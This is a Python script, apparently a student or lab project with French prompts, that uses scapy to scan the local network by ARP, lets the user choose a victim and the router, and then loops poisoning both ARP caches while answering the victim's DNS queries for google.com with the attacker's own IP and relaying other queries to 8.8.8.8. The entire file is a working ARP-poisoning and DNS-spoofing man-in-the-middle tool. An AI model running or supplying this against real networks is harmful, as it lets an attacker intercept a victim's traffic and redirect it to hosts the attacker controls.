from ipaddress import IPv4Network # Used to check if the IP address entered by the user is valid and also get the IP address of the attacker.
from scapy import all as scapy # Used to send and receive packets.
from scapy.layers.inet import IP, UDP
from scapy.layers.dns import DNS, DNSQR, DNSRR
from socket import * # Used to get the network mask.
from fcntl import ioctl # Used to get the network mask.
from struct import pack # Used to get the network mask.
import os # Used to check if the program is running on my computer or on a VM.

def interfaceChecker():
    """ Checks if the program is running on my computer or on a VM. 
    If it is running on my computer, it returns the interface name : 'wlp0s20f3'.
    If it is running on a VM, it returns the interface name : 'enp0s8'.
    """
    if os.uname()[1] == 'machine':
        interface = 'enp0s8'
    else:
        interface = 'wlp0s20f3'
    return interface

def getNetworkMask(interface):
    """ Returns the network mask of the interface passed in parameter. 

    Parameters
    ----------
    interface : str
        The name of the interface.

    Returns
    -------
    str    
    """
    s = socket(AF_INET, SOCK_DGRAM)
    netmask = ioctl(s.fileno(), 0x891b, pack('256s', interface[:15].encode('utf-8')))[20:24]
    return inet_ntoa(netmask)

def makeARPRequest(ip):
    """ Sends an ARP request to the network and returns the answered and unanswered packets.

    Parameters
    ----------
    ip : str
        The IP address of the network.

    Returns
    -------
    answered : list
        The answered packets.
    unanswered : list
        The unanswered packets.
    """
    arpRequest = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    arpRequestBroadcast = broadcast / arpRequest
    (answered, unanswered) = scapy.srp(arpRequestBroadcast, timeout=1, verbose=0)
    return answered, unanswered

def forwardDnsSpoofing(spooferIP):
    """ Returns a function that forwards the DNS request to the DNS server and sends a DNS response to the victim.

    Parameters
    ----------
    spooferIP : str
        The IP address of the attacker.

    Returns
    -------
    function
    """
    def forwardDNS(orgPacket: IP):
        """ Forwards the DNS request to the DNS server and sends a DNS response to the victim.

        Parameters
        ----------
        orgPacket : IP
            The packet received by the attacker.
        """
        print(orgPacket[DNSQR].qname)
        if orgPacket[DNSQR].qname == b'google.com.':
            print('DNS Spoofing')
            spoofedPacket = IP(dst=orgPacket[IP].src, src=orgPacket[IP].dst) / UDP(dport=orgPacket[UDP].sport, sport=orgPacket[UDP].dport) / DNS(id=orgPacket[DNS].id, qr=1, qd=orgPacket[DNS].qd, an=DNSRR(rrname=orgPacket[DNSQR].qname, ttl=10, rdata=spooferIP) / DNSRR(rrname=orgPacket[DNSQR].qname, ttl=10, rdata=spooferIP))
            scapy.send(spoofedPacket, verbose=1)
            print('DNS Spoofed')
        else:
            print('DNS Forwarding')
            newPacket = IP(dst='8.8.8.8') / UDP(sport=orgPacket[UDP].sport, dport=53) / DNS(rd=1, id=orgPacket[DNS].id, qd=DNSQR(qname=orgPacket[DNSQR].qname))
            answer = scapy.sr1(newPacket)
            respPacket = IP(dst=orgPacket[IP].src, src=orgPacket[IP].dst) / UDP(dport=orgPacket[UDP].sport, sport=orgPacket[UDP].dport) / DNS()
            respPacket[DNS] = answer[DNS]
            scapy.send(respPacket, verbose=1)
            print('DNS Forwarded')
    print('DNS spoofing started')
    return forwardDNS

def main():
    """ The main function. """
    interface = interfaceChecker()
    netmask = getNetworkMask(interface)
    myIp=scapy.get_if_addr(interface)
    myMac=scapy.get_if_hwaddr(interface)
    address = IPv4Network(myIp + '/' + netmask, False)
    ip = address.network_address
    pcs=[]
    addressMask = address.prefixlen
    answered, unanswered = makeARPRequest(str(ip)+'/'+str(addressMask))
    for element in answered:
        pcs.append([element[1].hwsrc, element[1].psrc])
    pcs.sort(key=lambda x: [int (y) for y in x[1].split('.')])
    compteur = 0
    for pc in pcs:
        print(str(compteur+1)+ ' - ' + pc[0] + ' ' + pc[1])
        compteur+=1
    cible=input('Entrez le numéro de la cible : ')
    cible=pcs[int(cible)-1]
    print('Vous avez choisi : ' + cible[0] + ' ' + cible[1])
    routeur=input('Entrez le numéro du routeur : ')
    routeur=pcs[int(routeur)-1]
    print('Vous avez choisi : ' + routeur[0] + ' ' + routeur[1])
    while True: # The attacker sends an ARP response to the victim and the router and also it checks if the victim is sending a DNS request and if it is, it sends a DNS response to the victim.
        scapy.send(scapy.ARP(op=2, pdst=cible[1], hwdst=cible[0], psrc=routeur[1], hwsrc=myMac), verbose=0)
        scapy.send(scapy.ARP(op=2, pdst=routeur[1], hwdst=routeur[0], psrc=cible[1], hwsrc=myMac), verbose=0)
        scapy.sniff(prn=forwardDnsSpoofing(myIp), filter='udp port 53', iface=interface, store=0, timeout=60, count=1)

if __name__ == '__main__':
    main()
